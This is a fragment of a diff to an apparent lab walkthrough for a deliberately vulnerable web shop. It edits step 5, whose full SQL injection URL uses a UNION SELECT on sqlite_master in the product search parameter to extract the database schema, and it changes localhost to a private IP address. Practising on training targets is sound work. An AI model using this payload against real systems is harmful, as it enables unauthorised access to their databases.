@@ -60,8 +60,8 @@ Change bid value to say 1
 
 **5\. Injection SQL \- Extract the database schema using a UNION-based SQL injection in search/query parameter**
 
-Paste [http://localhost:3000/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,%20%272%27,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20sqlite\_master--](http://192.168.20.11:3000/rest/products/search?q=%27))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--
-)
+[http://192.168.20.11:3000/rest/products/search?q=%27))UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--]
+
 
 Change localhost
 
